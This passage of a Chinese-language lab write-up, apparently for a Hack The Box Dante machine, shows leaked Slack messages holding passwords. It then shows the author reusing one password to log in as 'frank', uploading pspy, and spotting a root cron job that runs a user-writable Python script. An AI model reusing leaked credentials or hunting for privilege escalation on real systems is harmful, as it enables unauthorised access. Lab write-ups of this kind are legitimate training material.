            "team": "T013LTDB554",
            "name": "htb_donotuse",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "QtUII",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Ahh sorry about that - its STARS5678FORTUNE401"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "4408bde0-2036-41e3-8fe0-563fc3e34576",
        "type": "message",
        "text": "Thanks very much, I'll get on that now.",
        "user": "U014025GL3W",
        "ts": "1589794355.003700",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "g368549a1713",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "first_name": "",
            "real_name": "Margaret",
            "display_name": "Margaret",
            "team": "T013LTDB554",
            "name": "thisissecretright",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "vS2m",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Thanks very much, I'll get on that now."
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "ad6201ce-f21e-4536-88e5-629e929a8461",
        "type": "message",
        "text": "No problem at all. I'll make this channel private from now on - we cant risk another breach",
        "user": "U013CT40QHM",
        "ts": "1589794395.004200",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "ga341d23f843",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "first_name": "",
            "real_name": "Frank",
            "display_name": "",
            "team": "T013LTDB554",
            "name": "htb_donotuse",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "GW7",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "No problem at all. I'll make this channel private from now on - we cant risk another breach"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "0db0128e-52cf-468b-9b5f-5df008169397",
        "type": "message",
        "text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account",
        "user": "U014025GL3W",
        "ts": "1589795777.004900",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "g368549a1713",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "first_name": "",
            "real_name": "Margaret",
            "display_name": "Margaret",
            "team": "T013LTDB554",
            "name": "thisissecretright",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "NRyy=",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "59070443-7ef0-4b17-a88f-072b71c37451",
        "type": "message",
        "text": "Thanks, will do",
        "user": "U013CT40QHM",
        "ts": "1589795785.005100",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "ga341d23f843",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "first_name": "",
            "real_name": "Frank",
            "display_name": "",
            "team": "T013LTDB554",
            "name": "htb_donotuse",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "NTkt",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Thanks, will do"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "386f950e-2c8f-4d02-93de-5ef92bf6172b",
        "type": "message",
        "text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username",
        "user": "U014025GL3W",
        "ts": "1589806690.005900",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "g368549a1713",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "first_name": "",
            "real_name": "Margaret",
            "display_name": "Margaret",
            "team": "T013LTDB554",
            "name": "thisissecretright",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "oT1",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
                                                                }
                        ]
                    }
                ]
            }
        ]
    }
]

```

"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"

尝试以此登录另一个用户frank

```c
frank/TractorHeadtorchDeskmat
```

成功登录



### 提权-root
```c
frank@DANTE-NIX02:~$ ls
apache_restart.py  Downloads  Public       Templates
Desktop            Music      __pycache__  Videos
Documents          Pictures   snap
frank@DANTE-NIX02:~$ cat apache_restart.py 
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)
```

看到这个脚本联想到计划任务

```c
frank@DANTE-NIX02:~$ ls /etc/cron.d
anacron       omsagent               popularity-contest
e2scrub_all   OMSConsistencyInvoker  scxagent
omilogrotate  php
frank@DANTE-NIX02:/etc/cron.d$ cat * |grep frank
```

没找到居然

问题不大，上传个pspy

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/pspy]
└─# proxychains scp pspy64 frank@172.16.1.10:/tmp/ 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.10:22  ...  OK
frank@172.16.1.10's password: 
pspy64                 100% 3032KB   1.2MB/s   00:02    
```

```c
frank@DANTE-NIX02:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/01/30 21:53:49 CMD: UID=1000  PID=16504  | ./pspy64 
2026/01/30 21:53:49 CMD: UID=1000  PID=16449  | -bash 
2026/01/30 21:53:49 CMD: UID=1000  PID=16442  | sshd: frank@pts/0                                                 
2026/01/30 21:53:49 CMD: UID=0     PID=16384  | sshd: frank [priv]                                                
2026/01/30 21:53:49 CMD: UID=0     PID=16020  | 
2026/01/30 21:53:49 CMD: UID=0     PID=16019  | 
2026/01/30 21:53:49 CMD: UID=0     PID=15995  | 
2026/01/30 21:53:49 CMD: UID=0     PID=15987  | 
2026/01/30 21:53:49 CMD: UID=0     PID=15510  | 
2026/01/30 21:53:49 CMD: UID=0     PID=14862  | 
2026/01/30 21:53:49 CMD: UID=0     PID=14830  | 
2026/01/30 21:53:49 CMD: UID=0     PID=14002  | 
2026/01/30 21:53:49 CMD: UID=0     PID=12614  | 
2026/01/30 21:53:49 CMD: UID=33    PID=12084  | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=12083  | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=12082  | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=0     PID=5939   | 
2026/01/30 21:53:49 CMD: UID=1000  PID=2833   | /snap/slack/65/usr/lib/slack/slack --type=renderer --enable-crashpad --crashpad-handler-pid=2296 --enable-crash-reporter=1e7ae445-1f00-499e-a0ec-87856f9f51b2,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --standard-schemes=app,slack-webapp-dev --secure-schemes=app,slack-webapp-dev --bypasscsp-schemes=slack-webapp-dev --cors-schemes=slack-webapp-dev --fetch-schemes=slack-webapp-dev --service-worker-schemes=slack-webapp-dev --streaming-schemes --app-path=/snap/slack/65/usr/lib/slack/resources/app.asar --enable-sandbox --enable-blink-features=ExperimentalJSProfiler --disable-blink-features --no-sandbox --autoplay-policy=no-user-gesture-required --enable-logging --force-color-profile=srgb --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --lang=en-US --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=342304551 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,3473192844131938536,15416403504192533388,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand --window-type=main            
2026/01/30 21:53:49 CMD: UID=1000  PID=2811   | /snap/slack/65/usr/lib/slack/slack --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --enable-logging --enable-crashpad --crashpad-handler-pid=2296 --enable-crash-reporter=1e7ae445-1f00-499e-a0ec-87856f9f51b2,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --standard-schemes=app,slack-webapp-dev --secure-schemes=app,slack-webapp-dev --bypasscsp-schemes=slack-webapp-dev --cors-schemes=slack-webapp-dev --fetch-schemes=slack-webapp-dev --service-worker-schemes=slack-webapp-dev --streaming-schemes --enable-logging --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,3473192844131938536,15416403504192533388,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand --enable-crashpad                                            
2026/01/30 21:53:49 CMD: UID=1000  PID=2792   | /usr/bin/snap userd                                               
2026/01/30 21:53:49 CMD: UID=1000  PID=2377   | update-notifier                                                   
2026/01/30 21:53:49 CMD: UID=1000  PID=2372   | /usr/libexec/gvfsd-metadata                                       
2026/01/30 21:53:49 CMD: UID=1000  PID=2311   | /snap/slack/65/usr/lib/slack/slack --type=gpu-process --no-sandbox --enable-logging --enable-crashpad --crashpad-handler-pid=2296 --enable-crash-reporter=1e7ae445-1f00-499e-a0ec-87856f9f51b2,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --gpu-preferences=WAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAABAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --enable-logging --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --shared-files --field-trial-handle=0,i,3473192844131938536,15416403504192533388,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand                   
2026/01/30 21:53:49 CMD: UID=1000  PID=2296   | /snap/slack/65/usr/lib/slack/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --no-rate-limit --no-upload-gzip --database=/home/frank/snap/slack/65/.config/Slack/Crashpad --url=https://slack.com/apps/sentryproxy/api/5277886/minidump/?sentry_key=fd30fe469dbf4aec9db40548e5acf91e --annotation=_productName=Slack --annotation=_version=4.28.171 --annotation=lsb-release=Unknown --annotation=plat=Linux --annotation=prod=Electron --annotation=sentry___initialScope={"release":"Slack@4.28.171","environment":"production","user":{"id":"9267d010-0c00-5b43-b08b-288e1d53945f"},"tags":{"uuid":"9267d010-0c00-5b43-b08b-288e1d53945f"}} --annotation=ver=20.0.3 --initial-client-fd=42 --shared-client-connection                             
2026/01/30 21:53:49 CMD: UID=1000  PID=2270   | /snap/slack/65/usr/lib/slack/slack --type=zygote --no-sandbox --enable-crashpad --enable-crashpad                          
2026/01/30 21:53:49 CMD: UID=1000  PID=2269   | /snap/slack/65/usr/lib/slack/slack --type=zygote --no-zygote-sandbox --no-sandbox --enable-crashpad --enable-crashpad      
2026/01/30 21:53:49 CMD: UID=1000  PID=2266   | /snap/slack/65/usr/lib/slack/slack --no-sandbox --executed-from=/home/frank --pid=1753 --enable-crashpad                   
2026/01/30 21:53:49 CMD: UID=1000  PID=2221   | /usr/libexec/xdg-desktop-portal-gtk                               
2026/01/30 21:53:49 CMD: UID=1000  PID=2217   | /usr/libexec/xdg-desktop-portal                                   
2026/01/30 21:53:49 CMD: UID=1000  PID=1861   | /usr/libexec/xdg-document-portal                                  
2026/01/30 21:53:49 CMD: UID=1000  PID=1846   | /snap/snap-store/558/usr/bin/snap-store --gapplication-service    
2026/01/30 21:53:49 CMD: UID=121   PID=1829   | /usr/libexec/colord                                               
2026/01/30 21:53:49 CMD: UID=1000  PID=1828   | /usr/libexec/gsd-printer                                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1780   | /usr/bin/vmtoolsd -n vmusr --blockFd 3                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1778   | /usr/libexec/evolution-data-server/evolution-alarm-notify         
2026/01/30 21:53:49 CMD: UID=1000  PID=1756   | /usr/libexec/ibus-engine-simple                                   
2026/01/30 21:53:49 CMD: UID=1000  PID=1749   | /usr/libexec/gsd-disk-utility-notify                              
2026/01/30 21:53:49 CMD: UID=1000  PID=1731   | /usr/libexec/evolution-addressbook-factory                        
2026/01/30 21:53:49 CMD: UID=1000  PID=1720   | /usr/libexec/gsd-xsettings                                        
2026/01/30 21:53:49 CMD: UID=1000  PID=1719   | /usr/libexec/gvfsd-trash --spawner :1.3 /org/gtk/gvfs/exec_spaw/0 
2026/01/30 21:53:49 CMD: UID=1000  PID=1718   | /usr/libexec/gsd-wwan                                             
2026/01/30 21:53:49 CMD: UID=1000  PID=1716   | /usr/libexec/gsd-wacom                                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1708   | /usr/libexec/gsd-usb-protection                                   
2026/01/30 21:53:49 CMD: UID=1000  PID=1706   | /usr/libexec/gsd-sound                                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1702   | /usr/libexec/gsd-smartcard                                        
2026/01/30 21:53:49 CMD: UID=1000  PID=1696   | /usr/libexec/gsd-sharing                                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1687   | /usr/libexec/gsd-screensaver-proxy                                
2026/01/30 21:53:49 CMD: UID=1000  PID=1677   | /usr/libexec/gsd-rfkill                                           
2026/01/30 21:53:49 CMD: UID=1000  PID=1676   | /usr/libexec/gsd-print-notifications                              
2026/01/30 21:53:49 CMD: UID=1000  PID=1673   | /usr/libexec/gsd-power                                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1671   | /usr/libexec/gsd-media-keys                                       
2026/01/30 21:53:49 CMD: UID=1000  PID=1668   | /usr/libexec/gsd-keyboard                                         
2026/01/30 21:53:49 CMD: UID=1000  PID=1665   | /usr/libexec/gsd-housekeeping                                     
2026/01/30 21:53:49 CMD: UID=1000  PID=1664   | /usr/libexec/gsd-datetime                                         
2026/01/30 21:53:49 CMD: UID=1000  PID=1663   | /usr/libexec/gsd-color                                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1661   | /usr/libexec/gsd-a11y-settings                                    
2026/01/30 21:53:49 CMD: UID=1000  PID=1654   | /usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications 
2026/01/30 21:53:49 CMD: UID=1000  PID=1647   | /usr/libexec/evolution-calendar-factory                           
2026/01/30 21:53:49 CMD: UID=1000  PID=1634   | /usr/libexec/dconf-service                                        
2026/01/30 21:53:49 CMD: UID=1000  PID=1628   | /usr/libexec/evolution-source-registry                            
2026/01/30 21:53:49 CMD: UID=1000  PID=1620   | /usr/libexec/gnome-shell-calendar-server                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1615   | /usr/libexec/xdg-permission-store                                 
2026/01/30 21:53:49 CMD: UID=1000  PID=1605   | /usr/libexec/at-spi2-registryd --use-gnome-session                
2026/01/30 21:53:49 CMD: UID=1000  PID=1596   | /usr/libexec/ibus-portal                                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1592   | /usr/libexec/ibus-x11 --kill-daemon                               
2026/01/30 21:53:49 CMD: UID=1000  PID=1590   | /usr/libexec/ibus-extension-gtk3                                  
2026/01/30 21:53:49 CMD: UID=1000  PID=1589   | /usr/libexec/ibus-dconf                                           
2026/01/30 21:53:49 CMD: UID=1000  PID=1585   | ibus-daemon --panel disable --xim                                 
2026/01/30 21:53:49 CMD: UID=0     PID=1582   | /opt/omi/bin/omiagent 9 10 --destdir / --providerdir /opt/omi/lib --loglevel WARNING                                       
2026/01/30 21:53:49 CMD: UID=997   PID=1573   | /opt/omi/bin/omiagent 9 10 --destdir / --providerdir /opt/omi/lib --loglevel WARNING                                       
2026/01/30 21:53:49 CMD: UID=1000  PID=1551   | /usr/bin/gnome-shell                                              
2026/01/30 21:53:49 CMD: UID=1000  PID=1535   | /usr/libexec/gnome-session-binary --systemd-service --session=ubuntu                                                       
2026/01/30 21:53:49 CMD: UID=1000  PID=1528   | /usr/libexec/gnome-session-ctl --monitor                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1516   | /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3               
2026/01/30 21:53:49 CMD: UID=1000  PID=1511   | /usr/libexec/at-spi-bus-launcher                                  
2026/01/30 21:53:49 CMD: UID=1000  PID=1440   | /usr/bin/ssh-agent /usr/bin/im-launch env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu                                                         
2026/01/30 21:53:49 CMD: UID=997   PID=1373   | /opt/microsoft/omsagent/ruby/bin/ruby /opt/microsoft/omsagent/bin/omsagent -d /var/opt/microsoft/omsagent/918c10a1-48e5-48c4-965b-210bd98c715f/run/omsagent.pid -o /var/opt/microsoft/omsagent/918c10a1-48e5-48c4-965b-210bd98c715f/log/omsagent.log -c /etc/opt/microsoft/omsagent/918c10a1-48e5-48c4-965b-210bd98c715f/conf/omsagent.conf --no-supervisor    
2026/01/30 21:53:49 CMD: UID=1000  PID=1358   | /usr/libexec/gnome-session-binary --systemd --systemd --session=ubuntu                                                     
2026/01/30 21:53:49 CMD: UID=0     PID=1319   | /usr/lib/upower/upowerd                                           
2026/01/30 21:53:49 CMD: UID=1000  PID=1311   | /usr/libexec/gvfs-gphoto2-volume-monitor                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1299   | /usr/libexec/goa-identity-service                                 
2026/01/30 21:53:49 CMD: UID=1000  PID=1267   | /usr/libexec/goa-daemon                                           
2026/01/30 21:53:49 CMD: UID=1000  PID=1257   | /usr/libexec/gvfs-goa-volume-monitor                              
2026/01/30 21:53:49 CMD: UID=1000  PID=1245   | /usr/libexec/gvfs-mtp-volume-monitor                              
2026/01/30 21:53:49 CMD: UID=1000  PID=1227   | /usr/libexec/gvfs-afc-volume-monitor                              
2026/01/30 21:53:49 CMD: UID=0     PID=1213   | /usr/sbin/cupsd -l                                                
2026/01/30 21:53:49 CMD: UID=1000  PID=1208   | /usr/libexec/gvfs-udisks2-volume-monitor                          
2026/01/30 21:53:49 CMD: UID=1000  PID=1201   | /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f -o big_writes      
2026/01/30 21:53:49 CMD: UID=0     PID=1181   | /usr/sbin/smbd --foreground --no-process-group                    
2026/01/30 21:53:49 CMD: UID=1000  PID=1178   | /usr/libexec/gvfsd                                                
2026/01/30 21:53:49 CMD: UID=0     PID=1167   | /usr/sbin/smbd --foreground --no-process-group                    
2026/01/30 21:53:49 CMD: UID=0     PID=1166   | /usr/sbin/smbd --foreground --no-process-group                    
2026/01/30 21:53:49 CMD: UID=111   PID=1150   | /usr/libexec/rtkit-daemon                                         
2026/01/30 21:53:49 CMD: UID=1000  PID=1149   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                  
2026/01/30 21:53:49 CMD: UID=1000  PID=1146   | /usr/lib/xorg/Xorg vt2 -displayfd 3 -auth /run/user/1000/gdm/Xauthority -background none -noreset -keeptty -verbose 3      
2026/01/30 21:53:49 CMD: UID=1000  PID=1144   | /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu                                                      
2026/01/30 21:53:49 CMD: UID=1000  PID=1139   | /usr/bin/gnome-keyring-daemon --daemonize --login                 
2026/01/30 21:53:49 CMD: UID=1000  PID=1136   | /usr/libexec/tracker-miner-fs                                     
2026/01/30 21:53:49 CMD: UID=1000  PID=1134   | /usr/bin/pulseaudio --daemonize=no --log-target=journal           
2026/01/30 21:53:49 CMD: UID=0     PID=1131   | /usr/sbin/smbd --foreground --no-process-group                    
2026/01/30 21:53:49 CMD: UID=1000  PID=1119   | (sd-pam) 
2026/01/30 21:53:49 CMD: UID=126   PID=1118   | /usr/sbin/mysqld                                                  
2026/01/30 21:53:49 CMD: UID=1000  PID=1117   | /lib/systemd/systemd --user                                       
2026/01/30 21:53:49 CMD: UID=116   PID=1112   | /usr/sbin/kerneloops                                              
2026/01/30 21:53:49 CMD: UID=116   PID=1110   | /usr/sbin/kerneloops --test                                       
2026/01/30 21:53:49 CMD: UID=120   PID=1109   | /usr/bin/whoopsie -f                                              
2026/01/30 21:53:49 CMD: UID=0     PID=1108   | /usr/sbin/nmbd --foreground --no-process-group                    
2026/01/30 21:53:49 CMD: UID=33    PID=1100   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=1099   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=1098   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=1097   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=33    PID=1096   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=0     PID=1092   | /usr/sbin/apache2 -k start                                        
2026/01/30 21:53:49 CMD: UID=0     PID=1091   | gdm-session-worker [pam/gdm-autologin]                            
2026/01/30 21:53:49 CMD: UID=998   PID=1090   | /opt/omi/bin/omiengine -d --logfilefd 3 --socketpair 9            
2026/01/30 21:53:49 CMD: UID=0     PID=1074   | /usr/sbin/gdm3                                                    
2026/01/30 21:53:49 CMD: UID=0     PID=1073   | /opt/omi/bin/omiserver -d                                         
2026/01/30 21:53:49 CMD: UID=0     PID=1045   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups           
2026/01/30 21:53:49 CMD: UID=0     PID=1037   | /usr/sbin/ModemManager                                            
2026/01/30 21:53:49 CMD: UID=0     PID=933    | /usr/sbin/cups-browsed                                            
2026/01/30 21:53:49 CMD: UID=115   PID=895    | avahi-daemon: chroot helper                                       
2026/01/30 21:53:49 CMD: UID=0     PID=852    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant                 
2026/01/30 21:53:49 CMD: UID=0     PID=851    | /usr/lib/udisks2/udisksd                                          
2026/01/30 21:53:49 CMD: UID=0     PID=846    | /lib/systemd/systemd-logind                                       
2026/01/30 21:53:49 CMD: UID=0     PID=838    | /usr/libexec/switcheroo-control                                   
2026/01/30 21:53:49 CMD: UID=0     PID=837    | /usr/lib/snapd/snapd                                              
2026/01/30 21:53:49 CMD: UID=104   PID=836    | /usr/sbin/rsyslogd -n -iNONE                                      
2026/01/30 21:53:49 CMD: UID=0     PID=833    | /usr/lib/policykit-1/polkitd --no-debug                           
2026/01/30 21:53:49 CMD: UID=0     PID=831    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers                                                       
2026/01/30 21:53:49 CMD: UID=0     PID=826    | /usr/sbin/irqbalance --foreground                                 
2026/01/30 21:53:49 CMD: UID=0     PID=809    | /usr/sbin/NetworkManager --no-daemon                              
2026/01/30 21:53:49 CMD: UID=103   PID=807    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                   
2026/01/30 21:53:49 CMD: UID=0     PID=804    | /usr/sbin/cron -f                                                 
2026/01/30 21:53:49 CMD: UID=115   PID=803    | avahi-daemon: running [DANTE-NIX02.local]                         
2026/01/30 21:53:49 CMD: UID=0     PID=800    | /usr/sbin/acpid                                                   
2026/01/30 21:53:49 CMD: UID=0     PID=799    | /usr/lib/accountsservice/accounts-daemon                          
2026/01/30 21:53:49 CMD: UID=0     PID=723    | /usr/bin/vmtoolsd                                                 
2026/01/30 21:53:49 CMD: UID=0     PID=714    | /usr/bin/VGAuthService                                            
2026/01/30 21:53:49 CMD: UID=102   PID=694    | /lib/systemd/systemd-timesyncd                                    
2026/01/30 21:53:49 CMD: UID=101   PID=693    | /lib/systemd/systemd-resolved                                     
2026/01/30 21:53:49 CMD: UID=0     PID=579    | 
2026/01/30 21:53:49 CMD: UID=0     PID=418    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid                
2026/01/30 21:53:49 CMD: UID=0     PID=406    | 
2026/01/30 21:53:49 CMD: UID=0     PID=405    | 
2026/01/30 21:53:49 CMD: UID=0     PID=404    | 
2026/01/30 21:53:49 CMD: UID=0     PID=403    | 
2026/01/30 21:53:49 CMD: UID=0     PID=402    | 
2026/01/30 21:53:49 CMD: UID=0     PID=401    | 
2026/01/30 21:53:49 CMD: UID=0     PID=400    | 
2026/01/30 21:53:49 CMD: UID=0     PID=399    | 
2026/01/30 21:53:49 CMD: UID=0     PID=398    | 
2026/01/30 21:53:49 CMD: UID=0     PID=397    | 
2026/01/30 21:53:49 CMD: UID=0     PID=396    | /lib/systemd/systemd-udevd                                        
2026/01/30 21:53:49 CMD: UID=0     PID=379    | 
2026/01/30 21:53:49 CMD: UID=0     PID=363    | /lib/systemd/systemd-journald                                     

2026/01/30 21:53:49 CMD: UID=0     PID=1      | /sbin/init auto noprompt                                          
2026/01/30 21:54:00 CMD: UID=1000  PID=16550  | /snap/slack/65/usr/lib/slack/slack --type=zygote --no-sandbox --enable-crashpad --enable-crashpad                          
2026/01/30 21:54:01 CMD: UID=997   PID=16561  | pgrep -U omsagent omiagent                                        
2026/01/30 21:54:01 CMD: UID=997   PID=16562  | sh -c /opt/omi/bin/omicli wql root/scx "SELECT PercentUserTime, PercentPrivilegedTime, UsedMemory, PercentUsedMemory FROM SCX_UnixProcessStatisticalInformation where Handle='1373'" | grep =                                                
2026/01/30 21:54:01 CMD: UID=997   PID=16564  | sh -c /opt/omi/bin/omicli wql root/scx "SELECT PercentUserTime, PercentPrivilegedTime, UsedMemory, PercentUsedMemory FROM SCX_UnixProcessStatisticalInformation where Handle='1373'" | grep =                                                
2026/01/30 21:54:01 CMD: UID=997   PID=16565  | grep = 
2026/01/30 21:54:01 CMD: UID=0     PID=16567  | /usr/sbin/CRON -f                                                 
2026/01/30 21:54:01 CMD: UID=0     PID=16568  | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py       
2026/01/30 21:54:01 CMD: UID=0     PID=16569  | python3 /home/frank/apache_restart.py                             
2026/01/30 21:54:01 CMD: UID=0     PID=16570  | sleep 1 
2026/01/30 21:54:02 CMD: UID=997   PID=16573  | 
2026/01/30 21:54:02 CMD: UID=997   PID=16572  | sh -c /opt/omi/bin/omicli wql root/scx "SELECT PercentUserTime, PercentPrivilegedTime, UsedMemory, PercentUsedMemory FROM SCX_UnixProcessStatisticalInformation where Handle='1573'" | grep =                                                
